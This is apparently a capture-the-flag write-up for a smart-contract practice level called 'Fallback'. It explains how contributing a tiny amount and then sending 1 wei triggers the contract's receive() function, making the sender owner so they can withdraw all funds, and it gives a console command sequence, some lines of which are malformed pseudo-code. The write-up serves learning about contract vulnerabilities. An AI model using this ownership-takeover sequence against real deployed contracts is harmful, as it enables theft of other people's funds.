# Fallback

## Description

The problem with this smart contract is that the owner can withdraw all the funds,
and it's very easy to become the owner.

If you activate the fallback function, you become the owner, you just need to get
over the requirement on line 35.

In order to do so, you have to invoke `contribute()`. We contribute `0.001 ETH - 1`,
the maximum allowed to try to become the new owner.

We check and verify that we aren't the owner, but our contribution is now positive.
We send 1 wei to the contract, activating the `receive()` fallback function, making us
the new owner.

We now withdraw, stealing all the funds.

## Command Sequence

```
> await contract.getContribution()
0
> await contract.owner()
not my address
> value = toWei("0.001" - 1)
> await contract.contribute({value: value})
> await.owner()
not my address
> await contract.getContribution()
bigger than zero
> await sendTransaction({from: player, to: contract.address, value: "0x1"})
> await contract.owner()
my address
> await contract.withdraw()
I steal the funds
```

## Note

Even though I've included an attacker smart contract, this doesn't work and is
only for practice/illustration. This vulnerabily must be exploited directly with
a javascript script.
